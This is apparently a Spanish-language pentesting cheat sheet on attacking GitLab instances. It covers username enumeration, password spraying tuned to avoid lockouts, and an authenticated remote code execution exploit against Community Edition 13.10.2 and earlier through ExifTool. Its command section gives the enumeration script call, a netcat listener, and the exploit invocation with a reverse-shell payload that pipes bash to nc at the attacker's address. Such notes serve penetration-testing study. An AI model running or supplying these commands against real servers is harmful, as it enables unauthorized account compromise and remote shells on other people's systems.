---
tags:
  - webapp
  - gitlab
  - attack
---
## Conceptos Clave (TL;DR)

* El acceso a una instancia de GitLab, incluso sin autenticación, puede conducir a la exposición de datos sensibles y al compromiso potencial de la organización.
* Históricamente, GitLab ha acumulado múltiples vulnerabilidades severas, algunas de las cuales permiten Ejecución Remota de Código (RCE).
* Aunque la enumeración de usuarios no siempre se considera una vulnerabilidad por el fabricante, es posible identificar usuarios válidos para realizar ataques de fuerza bruta o password spraying.
* Las versiones de GitLab Community Edition 13.10.2 y anteriores presentan una vulnerabilidad de RCE autenticado originada por el manejo de metadatos con ExifTool en la subida de imágenes.

## Herramientas Clave

* **gitlab_userenum.sh / Python script equivalente:** Automatiza el descubrimiento de usuarios válidos en la plataforma.
* **gitlab_13_10_2_rce.py:** Exploit de Python utilizado para ejecutar comandos arbitrarios abusando de la vulnerabilidad de ExifTool en versiones afectadas.
* **Netcat (nc):** Utilizado para configurar un listener y recibir la conexión inversa (reverse shell) proveniente del exploit.

## Metodología Paso a Paso

### Fase 1: Enumeración de Usuarios
El objetivo inicial es recolectar nombres de usuario válidos en la instancia objetivo. Esta tarea se agiliza significativamente utilizando scripts automatizados, permitiendo descubrir cuentas críticas como el usuario administrador por defecto ("root").

### Fase 2: Obtención de Credenciales
Con la lista de usuarios válidos obtenida, se puede ejecutar un ataque de password spraying controlado. Esto implica probar contraseñas comunes o credenciales filtradas de brechas de datos en las cuentas enumeradas. Si este método falla o no es viable, se debe verificar si la plataforma permite el auto-registro de usuarios para crear una cuenta directamente.

### Fase 3: Explotación (RCE Autenticado)
Para explotar la vulnerabilidad de ExifTool en versiones vulnerables (13.10.2 o inferiores), se requiere obligatoriamente una cuenta válida. Una vez autenticado (ya sea por OSINT, fuerza bruta o auto-registro), se ejecuta el script de explotación inyectando un payload de reverse shell que será ejecutado por el servidor subyacente.

## Cheat Sheet de Comandos
  
```bash
# Enumera usuarios en la instancia de GitLab objetivo usando una lista de posibles nombres.
# --url: URL base del servicio GitLab.
# --userlist: Diccionario o archivo de texto con la lista de usuarios a comprobar.

./gitlab_userenum.sh --url http://<TARGET_IP>:<TARGET_PORT>/ --userlist <WORDLIST>
```

```bash
# Inicia un listener en el equipo atacante para recibir la reverse shell.
# -l: Modo escucha (listen).
# -n: No resolver nombres de dominio (solo IPs).
# -v: Modo verboso.
# -p: Puerto local a escuchar.

nc -lnvp <ATTACKER_PORT>
```

```bash
# Ejecuta el exploit RCE autenticado contra la instancia vulnerable.
# -t: URL objetivo.
# -u: Nombre de usuario válido obtenido previamente.
# -p: Contraseña válida del usuario.
# -c: Comando a ejecutar en el sistema (en este caso, un payload estándar de reverse shell apuntando al equipo atacante).

python3 gitlab_13_10_2_rce.py -t http://<TARGET_IP>:<TARGET_PORT> -u <USER> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f '
```

## "Gotchas" y Troubleshooting

* **Políticas de Bloqueo (Account Lockout):** Se debe tener extrema precaución al realizar ataques de contraseñas. Por defecto (y en versiones previas a la 16.6), GitLab bloquea automáticamente las cuentas tras 10 intentos fallidos, manteniéndolas bloqueadas por un periodo de 10 minutos.

* **Configuración del Bloqueo:** En versiones iguales o superiores a la 16.6, los administradores pueden modificar los valores de `max_login_attempts` y `failed_login_attempts_unlock_period_in_minutes` desde la interfaz de usuario, por lo que el umbral de bloqueo podría ser aún más estricto.

* **Requisito Crítico para RCE:** El exploit de RCE mencionado asume un contexto *autenticado*. Si no logras comprometer una cuenta legítima y el registro de nuevos usuarios está deshabilitado, no podrás avanzar con este vector específico.